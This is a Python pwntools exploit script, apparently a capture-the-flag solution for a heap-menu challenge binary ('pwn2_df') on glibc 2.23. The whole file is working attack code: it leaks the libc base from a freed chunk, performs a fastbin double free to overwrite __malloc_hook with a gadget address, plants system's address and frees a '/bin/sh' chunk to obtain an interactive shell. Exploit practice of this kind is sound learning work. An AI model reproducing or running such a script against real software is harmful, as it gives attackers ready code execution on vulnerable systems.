from pwn import *

r = process('./pwn2_df')
libc = ELF("./libc.2.23.so")
def create(idx, sz, data):
    r.sendlineafter(b'>\n', b'1')
    r.sendlineafter(b'Index:', str(idx).encode())
    r.sendlineafter(b'Input size:', str(sz).encode())
    r.sendlineafter(b'Input data:', data)

def show(idx):
    r.sendlineafter(b'>\n', b'2')
    r.sendlineafter(b':', str(idx).encode())

def edit(idx, sz, data):
    r.sendlineafter(b'>\n', b'3')
    r.sendlineafter(b':', str(idx).encode())
    r.sendlineafter(b':', str(sz).encode())
    sleep(0.1)
    r.sendline(data)

def delete(idx):
    r.sendlineafter(b'>\n', b'4')
    r.sendlineafter(b':', str(idx).encode())

create(0, 0x80, b'a' * 0x8)
create(5, 0x80, b'/bin/sh\x00')
delete(0)
show(0)
r.recvuntil(b'Data = ')
libc.address= u64(r.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['main_arena'] - 88
log.info(f'libc address : 0x{libc.address:0x}')
create(2, 0x60, b'a' * 0x8) #2
create(3, 0x60, b'a' * 0x8) #3
delete(2)
delete(3)
delete(2)
create(0, 0x60, p64(libc.symbols['__malloc_hook'] - 0xb)) 
create(2, 0x60, b'a' * 0x8)
create(0, 0x60, p64(libc.symbols['__malloc_hook'] - 0xb))
create(3, 0x60, b'\x00' * 3 + p64(0x71))
delete(0)
delete(2)
delete(0)
create(0, 0x60, p64(libc.symbols['__malloc_hook'])) 
create(0, 0x60, b'a' * 8)
create(0, 0x60, b'a' * 8)
create(3, 0x60, b'\x00' * 0x58 + p64(libc.address + 0x39c713))
create(4, 0x500, b'\x00' * 0x8)
create(4, 0xb90, b'\x00' * 0xb75+ p64(libc.symbols['system']))
delete(5)
r.interactive()
